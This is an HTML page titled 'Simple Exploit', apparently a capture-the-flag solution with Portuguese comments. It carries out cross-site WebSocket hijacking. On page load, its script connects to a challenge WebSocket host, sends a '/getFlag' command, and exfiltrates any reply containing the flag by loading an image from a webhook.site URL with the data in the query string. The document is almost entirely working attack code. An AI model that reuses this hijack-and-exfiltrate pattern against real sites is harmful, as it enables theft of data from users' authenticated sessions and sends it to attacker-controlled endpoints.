<!DOCTYPE html>
<html>
<head>
    <title>Simple Exploit</title>
</head>
<body>
    <h1>Flag Capture</h1>
    
    <script>
        // Conectar imediatamente ao WebSocket
        const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
        
        socket.onopen = function() {
            // Enviar comando para obter a flag
            socket.send(JSON.stringify({ sender: 'user', message: '/getFlag' }));
        };
        
        socket.onmessage = function(event) {
            const data = JSON.parse(event.data);
            
            // Se contiver a flag, exfiltrar via imagem
            if (data.message && data.message.includes('Flag:')) {
                const img = new Image();
                img.src = "https://webhook.site/849b249a-8980-4038-9d90-9fbaa89dc2f8?flag=" + 
                          encodeURIComponent(data.message);
                document.body.appendChild(img);
            }
        };
    </script>
</body>
</html>